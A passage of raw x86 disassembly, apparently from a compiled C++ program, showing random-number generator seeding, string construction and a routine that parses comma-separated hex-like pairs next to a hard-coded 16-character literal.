  401804:	89 ca                	mov    %ecx,%edx
  401806:	c1 ea 1e             	shr    $0x1e,%edx
  401809:	31 ca                	xor    %ecx,%edx
  40180b:	69 ca 65 89 07 6c    	imul   $0x6c078965,%edx,%ecx
  401811:	8d 8c 08 70 02 00 00 	lea    0x270(%eax,%ecx,1),%ecx
  401818:	89 0c 85 48 3f 71 00 	mov    %ecx,0x713f48(,%eax,4)
  40181f:	40                   	inc    %eax
  401820:	75 e2                	jne    0x401804
  401822:	c7 05 84 35 71 00 70 	movl   $0x270,0x713584
  401829:	02 00 00 
  40182c:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401833:	ff ff ff 
  401836:	c7 04 24 0c 49 71 00 	movl   $0x71490c,(%esp)
  40183d:	e8 ce 4c 00 00       	call   0x406510
  401842:	c7 04 24 64 12 40 00 	movl   $0x401264,(%esp)
  401849:	e8 5a b4 01 00       	call   0x41cca8
  40184e:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401855:	ff ff ff 
  401858:	c7 04 24 0d 49 71 00 	movl   $0x71490d,(%esp)
  40185f:	e8 f4 95 00 00       	call   0x40ae58
  401864:	c7 04 24 84 12 40 00 	movl   $0x401284,(%esp)
  40186b:	e8 38 b4 01 00       	call   0x41cca8
  401870:	c7 45 d4 0f 00 00 00 	movl   $0xf,-0x2c(%ebp)
  401877:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  40187e:	c6 45 c0 00          	movb   $0x0,-0x40(%ebp)
  401882:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401889:	ff ff ff 
  40188c:	8d 75 bc             	lea    -0x44(%ebp),%esi
  40188f:	89 34 24             	mov    %esi,(%esp)
  401892:	c7 44 24 04 8c 23 42 	movl   $0x42238c,0x4(%esp)
  401899:	00 
  40189a:	e8 55 36 00 00       	call   0x404ef4
  40189f:	c7 85 68 ff ff ff 01 	movl   $0x1,-0x98(%ebp)
  4018a6:	00 00 00 
  4018a9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4018ad:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4018b0:	89 04 24             	mov    %eax,(%esp)
  4018b3:	e8 2c 04 00 00       	call   0x401ce4
  4018b8:	83 7d f0 0f          	cmpl   $0xf,-0x10(%ebp)
  4018bc:	77 05                	ja     0x4018c3
  4018be:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018c1:	eb 03                	jmp    0x4018c6
  4018c3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018c6:	c7 85 68 ff ff ff 02 	movl   $0x2,-0x98(%ebp)
  4018cd:	00 00 00 
  4018d0:	89 04 24             	mov    %eax,(%esp)
  4018d3:	e8 5a fa 01 00       	call   0x421332
  4018d8:	83 ec 04             	sub    $0x4,%esp
  4018db:	89 c6                	mov    %eax,%esi
  4018dd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4018e0:	83 f9 10             	cmp    $0x10,%ecx
  4018e3:	72 17                	jb     0x4018fc
  4018e5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018e8:	41                   	inc    %ecx
  4018e9:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4018ef:	72 03                	jb     0x4018f4
  4018f1:	8b 40 fc             	mov    -0x4(%eax),%eax
  4018f4:	89 04 24             	mov    %eax,(%esp)
  4018f7:	e8 c4 43 00 00       	call   0x405cc0
  4018fc:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401903:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40190a:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  40190e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401911:	83 f9 10             	cmp    $0x10,%ecx
  401914:	72 17                	jb     0x40192d
  401916:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401919:	41                   	inc    %ecx
  40191a:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401920:	72 03                	jb     0x401925
  401922:	8b 40 fc             	mov    -0x4(%eax),%eax
  401925:	89 04 24             	mov    %eax,(%esp)
  401928:	e8 93 43 00 00       	call   0x405cc0
  40192d:	89 35 1c 5e 71 00    	mov    %esi,0x715e1c
  401933:	c7 45 d4 0f 00 00 00 	movl   $0xf,-0x2c(%ebp)
  40193a:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401941:	c6 45 c0 00          	movb   $0x0,-0x40(%ebp)
  401945:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  40194c:	ff ff ff 
  40194f:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401952:	89 c6                	mov    %eax,%esi
  401954:	89 34 24             	mov    %esi,(%esp)
  401957:	c7 44 24 04 b1 23 42 	movl   $0x4223b1,0x4(%esp)
  40195e:	00 
  40195f:	e8 90 35 00 00       	call   0x404ef4
  401964:	c7 85 68 ff ff ff 03 	movl   $0x3,-0x98(%ebp)
  40196b:	00 00 00 
  40196e:	89 74 24 04          	mov    %esi,0x4(%esp)
  401972:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401975:	89 04 24             	mov    %eax,(%esp)
  401978:	e8 67 03 00 00       	call   0x401ce4
  40197d:	83 7d f0 0f          	cmpl   $0xf,-0x10(%ebp)
  401981:	77 05                	ja     0x401988
  401983:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401986:	eb 03                	jmp    0x40198b
  401988:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40198b:	c7 85 68 ff ff ff 04 	movl   $0x4,-0x98(%ebp)
  401992:	00 00 00 
  401995:	89 04 24             	mov    %eax,(%esp)
  401998:	e8 2b 07 00 00       	call   0x4020c8
  40199d:	89 c6                	mov    %eax,%esi
  40199f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4019a2:	83 f9 10             	cmp    $0x10,%ecx
  4019a5:	72 17                	jb     0x4019be
  4019a7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4019aa:	41                   	inc    %ecx
  4019ab:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4019b1:	72 03                	jb     0x4019b6
  4019b3:	8b 40 fc             	mov    -0x4(%eax),%eax
  4019b6:	89 04 24             	mov    %eax,(%esp)
  4019b9:	e8 02 43 00 00       	call   0x405cc0
  4019be:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  4019c5:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4019cc:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  4019d0:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4019d3:	83 f9 10             	cmp    $0x10,%ecx
  4019d6:	72 17                	jb     0x4019ef
  4019d8:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4019db:	41                   	inc    %ecx
  4019dc:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4019e2:	72 03                	jb     0x4019e7
  4019e4:	8b 40 fc             	mov    -0x4(%eax),%eax
  4019e7:	89 04 24             	mov    %eax,(%esp)
  4019ea:	e8 d1 42 00 00       	call   0x405cc0
  4019ef:	89 35 20 5e 71 00    	mov    %esi,0x715e20
  4019f5:	c7 45 d4 0f 00 00 00 	movl   $0xf,-0x2c(%ebp)
  4019fc:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401a03:	c6 45 c0 00          	movb   $0x0,-0x40(%ebp)
  401a07:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401a0e:	ff ff ff 
  401a11:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401a14:	89 c6                	mov    %eax,%esi
  401a16:	89 34 24             	mov    %esi,(%esp)
  401a19:	c7 44 24 04 cd 23 42 	movl   $0x4223cd,0x4(%esp)
  401a20:	00 
  401a21:	e8 ce 34 00 00       	call   0x404ef4
  401a26:	c7 85 68 ff ff ff 05 	movl   $0x5,-0x98(%ebp)
  401a2d:	00 00 00 
  401a30:	89 74 24 04          	mov    %esi,0x4(%esp)
  401a34:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401a37:	89 04 24             	mov    %eax,(%esp)
  401a3a:	e8 a5 02 00 00       	call   0x401ce4
  401a3f:	83 7d f0 0f          	cmpl   $0xf,-0x10(%ebp)
  401a43:	77 05                	ja     0x401a4a
  401a45:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401a48:	eb 03                	jmp    0x401a4d
  401a4a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a4d:	c7 85 68 ff ff ff 06 	movl   $0x6,-0x98(%ebp)
  401a54:	00 00 00 
  401a57:	89 04 24             	mov    %eax,(%esp)
  401a5a:	e8 d3 f8 01 00       	call   0x421332
  401a5f:	83 ec 04             	sub    $0x4,%esp
  401a62:	89 c6                	mov    %eax,%esi
  401a64:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401a67:	83 f9 10             	cmp    $0x10,%ecx
  401a6a:	72 17                	jb     0x401a83
  401a6c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a6f:	41                   	inc    %ecx
  401a70:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401a76:	72 03                	jb     0x401a7b
  401a78:	8b 40 fc             	mov    -0x4(%eax),%eax
  401a7b:	89 04 24             	mov    %eax,(%esp)
  401a7e:	e8 3d 42 00 00       	call   0x405cc0
  401a83:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401a8a:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401a91:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401a95:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401a98:	83 f9 10             	cmp    $0x10,%ecx
  401a9b:	72 17                	jb     0x401ab4
  401a9d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401aa0:	41                   	inc    %ecx
  401aa1:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401aa7:	72 03                	jb     0x401aac
  401aa9:	8b 40 fc             	mov    -0x4(%eax),%eax
  401aac:	89 04 24             	mov    %eax,(%esp)
  401aaf:	e8 0c 42 00 00       	call   0x405cc0
  401ab4:	89 35 24 5e 71 00    	mov    %esi,0x715e24
  401aba:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  401ac0:	89 04 24             	mov    %eax,(%esp)
  401ac3:	e8 ae f6 01 00       	call   0x421176
  401ac8:	81 c4 bc 00 00 00    	add    $0xbc,%esp
  401ace:	5e                   	pop    %esi
  401acf:	5f                   	pop    %edi
  401ad0:	5b                   	pop    %ebx
  401ad1:	5d                   	pop    %ebp
  401ad2:	c3                   	ret
  401ad3:	8b 85 64 ff ff ff    	mov    -0x9c(%ebp),%eax
  401ad9:	3d 06 00 00 00       	cmp    $0x6,%eax
  401ade:	76 02                	jbe    0x401ae2
  401ae0:	0f 0b                	ud2
  401ae2:	2d 01 00 00 00       	sub    $0x1,%eax
  401ae7:	ff 24 85 cc 1c 40 00 	jmp    *0x401ccc(,%eax,4)
  401aee:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401af4:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401afa:	eb 45                	jmp    0x401b41
  401afc:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401b02:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401b08:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401b0b:	83 f8 10             	cmp    $0x10,%eax
  401b0e:	72 1f                	jb     0x401b2f
  401b10:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401b13:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  401b16:	40                   	inc    %eax
  401b17:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401b1c:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401b1f:	72 06                	jb     0x401b27
  401b21:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401b24:	8b 40 fc             	mov    -0x4(%eax),%eax
  401b27:	89 04 24             	mov    %eax,(%esp)
  401b2a:	e8 91 41 00 00       	call   0x405cc0
  401b2f:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401b36:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401b3d:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401b41:	89 bd 50 ff ff ff    	mov    %edi,-0xb0(%ebp)
  401b47:	89 b5 5c ff ff ff    	mov    %esi,-0xa4(%ebp)
  401b4d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401b50:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401b53:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401b56:	83 f8 10             	cmp    $0x10,%eax
  401b59:	72 22                	jb     0x401b7d
  401b5b:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401b5e:	89 45 b0             	mov    %eax,-0x50(%ebp)
  401b61:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401b64:	40                   	inc    %eax
  401b65:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401b6a:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401b6d:	72 06                	jb     0x401b75
  401b6f:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401b72:	8b 40 fc             	mov    -0x4(%eax),%eax
  401b75:	89 04 24             	mov    %eax,(%esp)
  401b78:	e8 43 41 00 00       	call   0x405cc0
  401b7d:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  401b83:	e9 2f 01 00 00       	jmp    0x401cb7
  401b88:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401b8e:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401b94:	eb 45                	jmp    0x401bdb
  401b96:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401b9c:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401ba2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401ba5:	83 f8 10             	cmp    $0x10,%eax
  401ba8:	72 1f                	jb     0x401bc9
  401baa:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401bad:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  401bb0:	40                   	inc    %eax
  401bb1:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401bb6:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401bb9:	72 06                	jb     0x401bc1
  401bbb:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401bbe:	8b 40 fc             	mov    -0x4(%eax),%eax
  401bc1:	89 04 24             	mov    %eax,(%esp)
  401bc4:	e8 f7 40 00 00       	call   0x405cc0
  401bc9:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401bd0:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401bd7:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401bdb:	89 bd 4c ff ff ff    	mov    %edi,-0xb4(%ebp)
  401be1:	89 b5 58 ff ff ff    	mov    %esi,-0xa8(%ebp)
  401be7:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401bea:	89 45 a8             	mov    %eax,-0x58(%ebp)
  401bed:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401bf0:	83 f8 10             	cmp    $0x10,%eax
  401bf3:	72 22                	jb     0x401c17
  401bf5:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401bf8:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  401bfb:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401bfe:	40                   	inc    %eax
  401bff:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401c04:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  401c07:	72 06                	jb     0x401c0f
  401c09:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  401c0c:	8b 40 fc             	mov    -0x4(%eax),%eax
  401c0f:	89 04 24             	mov    %eax,(%esp)
  401c12:	e8 a9 40 00 00       	call   0x405cc0
  401c17:	8b 85 58 ff ff ff    	mov    -0xa8(%ebp),%eax
  401c1d:	e9 95 00 00 00       	jmp    0x401cb7
  401c22:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401c28:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401c2e:	eb 45                	jmp    0x401c75
  401c30:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401c36:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401c3c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401c3f:	83 f8 10             	cmp    $0x10,%eax
  401c42:	72 1f                	jb     0x401c63
  401c44:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401c47:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  401c4a:	40                   	inc    %eax
  401c4b:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401c50:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401c53:	72 06                	jb     0x401c5b
  401c55:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401c58:	8b 40 fc             	mov    -0x4(%eax),%eax
  401c5b:	89 04 24             	mov    %eax,(%esp)
  401c5e:	e8 5d 40 00 00       	call   0x405cc0
  401c63:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401c6a:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401c71:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401c75:	89 bd 48 ff ff ff    	mov    %edi,-0xb8(%ebp)
  401c7b:	89 b5 54 ff ff ff    	mov    %esi,-0xac(%ebp)
  401c81:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401c84:	89 45 9c             	mov    %eax,-0x64(%ebp)
  401c87:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401c8a:	83 f8 10             	cmp    $0x10,%eax
  401c8d:	72 22                	jb     0x401cb1
  401c8f:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401c92:	89 45 98             	mov    %eax,-0x68(%ebp)
  401c95:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401c98:	40                   	inc    %eax
  401c99:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401c9e:	8b 45 98             	mov    -0x68(%ebp),%eax
  401ca1:	72 06                	jb     0x401ca9
  401ca3:	8b 45 98             	mov    -0x68(%ebp),%eax
  401ca6:	8b 40 fc             	mov    -0x4(%eax),%eax
  401ca9:	89 04 24             	mov    %eax,(%esp)
  401cac:	e8 0f 40 00 00       	call   0x405cc0
  401cb1:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  401cb7:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401cbe:	ff ff ff 
  401cc1:	89 04 24             	mov    %eax,(%esp)
  401cc4:	e8 2b f4 01 00       	call   0x4210f4
  401cc9:	83 ec 04             	sub    $0x4,%esp
  401ccc:	ee                   	out    %al,(%dx)
  401ccd:	1a 40 00             	sbb    0x0(%eax),%al
  401cd0:	fc                   	cld
  401cd1:	1a 40 00             	sbb    0x0(%eax),%al
  401cd4:	88 1b                	mov    %bl,(%ebx)
  401cd6:	40                   	inc    %eax
  401cd7:	00 96 1b 40 00 22    	add    %dl,0x2200401b(%esi)
  401cdd:	1c 40                	sbb    $0x40,%al
  401cdf:	00 30                	add    %dh,(%eax)
  401ce1:	1c 40                	sbb    $0x40,%al
  401ce3:	00 55 89             	add    %dl,-0x77(%ebp)
  401ce6:	e5 53                	in     $0x53,%eax
  401ce8:	57                   	push   %edi
  401ce9:	56                   	push   %esi
  401cea:	81 ec ac 00 00 00    	sub    $0xac,%esp
  401cf0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401cf3:	83 ec 0c             	sub    $0xc,%esp
  401cf6:	6a 10                	push   $0x10
  401cf8:	e8 bb 8c 00 00       	call   0x40a9b8
  401cfd:	83 c4 10             	add    $0x10,%esp
  401d00:	c7 40 0c 34 67 00 00 	movl   $0x6734,0xc(%eax)
  401d07:	c7 40 08 72 68 74 6a 	movl   $0x6a746872,0x8(%eax)
  401d0e:	c7 40 04 66 77 65 34 	movl   $0x34657766,0x4(%eax)
  401d15:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401d18:	c7 00 66 67 64 68    	movl   $0x68646766,(%eax)
  401d1e:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  401d25:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401d2c:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  401d30:	8b 77 14             	mov    0x14(%edi),%esi
  401d33:	c7 85 74 ff ff ff ec 	movl   $0x4204ec,-0x8c(%ebp)
  401d3a:	04 42 00 
  401d3d:	c7 85 78 ff ff ff 58 	movl   $0x422558,-0x88(%ebp)
  401d44:	25 42 00 
  401d47:	89 ad 7c ff ff ff    	mov    %ebp,-0x84(%ebp)
  401d4d:	89 65 84             	mov    %esp,-0x7c(%ebp)
  401d50:	c7 85 7c ff ff ff e5 	movl   $0x401fe5,-0x84(%ebp)
  401d57:	1f 40 00 
  401d5a:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401d60:	e8 f0 f3 01 00       	call   0x421155
  401d65:	85 f6                	test   %esi,%esi
  401d67:	0f 84 79 01 00 00    	je     0x401ee6
  401d6d:	8d 47 04             	lea    0x4(%edi),%eax
  401d70:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401d73:	31 c9                	xor    %ecx,%ecx
  401d75:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401d7c:	0f 1f 84 00 00 00 00 
  401d83:	00 
  401d84:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  401d88:	77 1a                	ja     0x401da4
  401d8a:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401d8d:	80 3c 08 2c          	cmpb   $0x2c,(%eax,%ecx,1)
  401d91:	74 1e                	je     0x401db1
  401d93:	e9 45 01 00 00       	jmp    0x401edd
  401d98:	66 66 66 2e 0f 1f 84 	data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401d9f:	00 00 00 00 00 
  401da4:	8b 47 04             	mov    0x4(%edi),%eax
  401da7:	80 3c 08 2c          	cmpb   $0x2c,(%eax,%ecx,1)
  401dab:	0f 85 2c 01 00 00    	jne    0x401edd
  401db1:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  401db4:	8d 41 fe             	lea    -0x2(%ecx),%eax
  401db7:	c7 45 b0 0f 00 00 00 	movl   $0xf,-0x50(%ebp)
  401dbe:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%ebp)
  401dc5:	c6 45 9c 00          	movb   $0x0,-0x64(%ebp)
  401dc9:	c7 85 60 ff ff ff 02 	movl   $0x2,-0xa0(%ebp)
  401dd0:	00 00 00 
  401dd3:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  401dd6:	6a 02                	push   $0x2
  401dd8:	50                   	push   %eax
  401dd9:	57                   	push   %edi
  401dda:	51                   	push   %ecx
  401ddb:	e8 6c 2b 00 00       	call   0x40494c
  401de0:	83 c4 10             	add    $0x10,%esp
  401de3:	83 7d b0 0f          	cmpl   $0xf,-0x50(%ebp)
  401de7:	77 0b                	ja     0x401df4
  401de9:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401dec:	eb 09                	jmp    0x401df7
  401dee:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  401df4:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401df7:	c7 85 60 ff ff ff 03 	movl   $0x3,-0xa0(%ebp)
  401dfe:	00 00 00 
  401e01:	83 ec 04             	sub    $0x4,%esp
  401e04:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  401e07:	51                   	push   %ecx
  401e08:	68 db 20 42 00       	push   $0x4220db
  401e0d:	50                   	push   %eax
  401e0e:	e8 f1 27 01 00       	call   0x414604
  401e13:	83 c4 10             	add    $0x10,%esp
  401e16:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  401e19:	83 f9 10             	cmp    $0x10,%ecx
  401e1c:	72 1b                	jb     0x401e39
  401e1e:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401e21:	41                   	inc    %ecx
  401e22:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401e28:	72 03                	jb     0x401e2d
  401e2a:	8b 40 fc             	mov    -0x4(%eax),%eax
  401e2d:	83 ec 0c             	sub    $0xc,%esp
  401e30:	50                   	push   %eax
  401e31:	e8 8a 3e 00 00       	call   0x405cc0
  401e36:	83 c4 10             	add    $0x10,%esp
  401e39:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401e3c:	83 f8 fe             	cmp    $0xfffffffe,%eax
  401e3f:	0f 83 86 01 00 00    	jae    0x401fcb
  401e45:	0f b6 4d 94          	movzbl -0x6c(%ebp),%ecx
  401e49:	88 4d f3             	mov    %cl,-0xd(%ebp)
  401e4c:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401e4f:	8d 48 01             	lea    0x1(%eax),%ecx
  401e52:	c7 85 60 ff ff ff 05 	movl   $0x5,-0xa0(%ebp)
  401e59:	00 00 00 
  401e5c:	83 ec 04             	sub    $0x4,%esp
  401e5f:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401e62:	6a 00                	push   $0x0
  401e64:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  401e67:	51                   	push   %ecx
  401e68:	50                   	push   %eax
  401e69:	e8 22 2c 00 00       	call   0x404a90
  401e6e:	83 c4 10             	add    $0x10,%esp
  401e71:	84 c0                	test   %al,%al
  401e73:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401e76:	74 5e                	je     0x401ed6
  401e78:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401e7b:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401e7e:	8b 75 b8             	mov    -0x48(%ebp),%esi
  401e81:	29 f0                	sub    %esi,%eax
  401e83:	74 24                	je     0x401ea9
  401e85:	83 f9 0f             	cmp    $0xf,%ecx
  401e88:	77 05                	ja     0x401e8f
  401e8a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401e8d:	eb 03                	jmp    0x401e92
  401e8f:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401e92:	8d 54 31 01          	lea    0x1(%ecx,%esi,1),%edx
  401e96:	01 f1                	add    %esi,%ecx
  401e98:	83 ec 04             	sub    $0x4,%esp
  401e9b:	50                   	push   %eax
  401e9c:	51                   	push   %ecx
  401e9d:	52                   	push   %edx
  401e9e:	e8 26 fb 00 00       	call   0x4119c9
  401ea3:	83 c4 10             	add    $0x10,%esp
  401ea6:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401ea9:	83 f9 0f             	cmp    $0xf,%ecx
  401eac:	77 05                	ja     0x401eb3
  401eae:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401eb1:	eb 03                	jmp    0x401eb6
  401eb3:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401eb6:	0f b6 4d f3          	movzbl -0xd(%ebp),%ecx
  401eba:	88 0c 30             	mov    %cl,(%eax,%esi,1)
  401ebd:	83 7d e8 0f          	cmpl   $0xf,-0x18(%ebp)
  401ec1:	77 05                	ja     0x401ec8
  401ec3:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401ec6:	eb 03                	jmp    0x401ecb
  401ec8:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401ecb:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  401ece:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  401ed1:	c6 44 30 01 00       	movb   $0x0,0x1(%eax,%esi,1)
  401ed6:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  401ed9:	41                   	inc    %ecx
  401eda:	8b 77 14             	mov    0x14(%edi),%esi
  401edd:	41                   	inc    %ecx
  401ede:	39 f1                	cmp    %esi,%ecx
  401ee0:	0f 82 9e fe ff ff    	jb     0x401d84
  401ee6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401ee9:	c7 41 18 0f 00 00 00 	movl   $0xf,0x18(%ecx)
  401ef0:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  401ef7:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
  401efb:	c7 85 60 ff ff ff 01 	movl   $0x1,-0xa0(%ebp)
  401f02:	00 00 00 
  401f05:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401f08:	6a ff                	push   $0xffffffff
  401f0a:	6a 00                	push   $0x0
  401f0c:	50                   	push   %eax
  401f0d:	51                   	push   %ecx
  401f0e:	e8 39 2a 00 00       	call   0x40494c
  401f13:	83 c4 10             	add    $0x10,%esp
  401f16:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401f1a:	74 58                	je     0x401f74
  401f1c:	8b 45 08             	mov    0x8(%ebp),%eax
  401f1f:	8d 40 04             	lea    0x4(%eax),%eax
  401f22:	31 c9                	xor    %ecx,%ecx
  401f24:	31 d2                	xor    %edx,%edx
  401f26:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401f2d:	1f 84 00 00 00 00 00 
  401f34:	83 7d e8 0f          	cmpl   $0xf,-0x18(%ebp)
  401f38:	77 0a                	ja     0x401f44
  401f3a:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  401f3d:	eb 08                	jmp    0x401f47
  401f3f:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401f44:	8b 75 d4             	mov    -0x2c(%ebp),%esi
